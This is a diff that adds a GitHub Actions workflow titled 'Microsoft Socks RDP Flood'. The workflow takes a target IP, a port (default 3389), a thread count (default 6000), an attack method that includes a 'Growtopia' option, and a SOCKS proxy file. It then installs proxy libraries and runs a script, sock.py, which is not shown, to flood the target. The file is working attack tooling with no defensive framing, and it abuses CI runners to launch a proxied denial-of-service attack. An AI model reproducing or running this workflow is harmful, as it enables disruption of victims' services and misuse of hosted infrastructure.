@@ -1,0 +1,42 @@
+name: Microsoft Socks RDP Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+      portgt:
+        description: "Port Target"
+        required: true
+        default: "3389"
+      thread:
+        description: "Threads"
+        required: true
+        default: "6000"
+      method:
+        description: "1. Normal (Web) | 2. Growtopia"
+        required: true
+        default: "1"
+      prox:
+        description: "Socks4/5 File Name"
+        required: true
+        default: "socks.txt"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install socks pysocks requests
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        python sock.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.method }} ${{ github.event.inputs.prox }}
